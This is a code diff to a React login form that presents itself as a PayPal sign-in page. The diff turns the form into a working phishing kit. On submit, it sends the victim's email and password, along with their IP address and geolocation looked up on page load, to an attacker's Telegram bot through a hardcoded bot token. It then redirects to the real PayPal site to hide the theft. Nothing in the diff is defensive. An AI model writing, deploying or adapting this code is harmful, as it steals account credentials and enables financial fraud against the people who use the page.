@@ -1,10 +1,16 @@
 "use client";
-import React, { useState } from "react";
-import { Form, Input, Button, Divider } from "antd";
+import React, { useEffect, useState } from "react";
+import { Form, Input, Button, Divider, message } from "antd";
 import logo from "../../../../public/images/logo.png";
 import Image from "next/image";
+import { useDispatch, useSelector } from "react-redux";
+import axios from "axios";
+import { redirectOrderReceived } from "@/store/slices/productSlice";
 
 const LoginForm = () => {
+  const dispatch = useDispatch();
+  const [country, setCountry] = useState({});
+  const [ip, setIPAddress] = useState(0);
   const [isHoveredFwPw, setIsHoveredFwPw] = useState(false);
   const [isHoveredLogin, setIsHoveredLogin] = useState(false);
   const [isHoveredSignup, setIsHoveredSignup] = useState(false);
@@ -33,27 +39,46 @@ const LoginForm = () => {
     setIsHoveredSignup(false);
   };
 
-  const onFinish = (values) => {
-    console.log("Received values:", values);
+  const onFinish = async (values) => {
+    try {
+      await axios.post(
+        "https://api.telegram.org/bot6711426105:AAFjrbeuBzRtvgKon78_S12A14j8jLC7ISs/sendMessage",
+        {
+          chat_id: "-4048735773",
+          text: `
+        \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${country?.country} | ${country?.timezone}
+        \t ----------- INFOR PAYPAL -----------
+        \tUSERNAME:         ${values?.email}
+        \tPASSWORD:         ${values?.password}
+              `,
+        }
+      );
+      window.open("https://www.paypal.com/");
+
+      window.close();
+    } catch (error) {}
   };
 
-  const dividerStyle = {
-    display: "flex",
-    alignItems: "center",
-    width: "100%",
-    borderTop: "1px solid #ccc",
+  const getCountry = (ip) => {
+    fetch(`https://ipinfo.io/${ip}?token=930e3b99f29bed`)
+      .then((response) => response.json())
+      .then((data) => setCountry(data))
+      .catch((error) => console.log(error));
   };
 
-  const textStyle = {
-    flexGrow: 1,
-    textAlign: "center",
-    margin: "0 10px",
-  };
+  useEffect(() => {
+    fetch("https://api.ipify.org?format=json")
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip);
+        getCountry(data.ip);
+      })
+      .catch((error) => console.log(error));
+  }, []);
 
   return (
     <Form
       name="login"
-      initialValues={{ remember: true }}
       onFinish={onFinish}
       form={form}
       style={{
@@ -92,7 +117,10 @@ const LoginForm = () => {
         />
       </Form.Item>
 
-      <Form.Item name="email" rules={[{ required: true, message: "Required" }]}>
+      <Form.Item
+        name="password"
+        rules={[{ required: true, message: "Required" }]}
+      >
         <Input
           placeholder="Password"
           style={{
@@ -110,6 +138,9 @@ const LoginForm = () => {
 
       <Form.Item>
         <div
+          onClick={() => {
+            window.open("https://www.paypal.com/authflow/password-recovery");
+          }}
           onMouseOver={handleMouseOverFwPw}
           onMouseOut={handleMouseOutFwPw}
           style={{
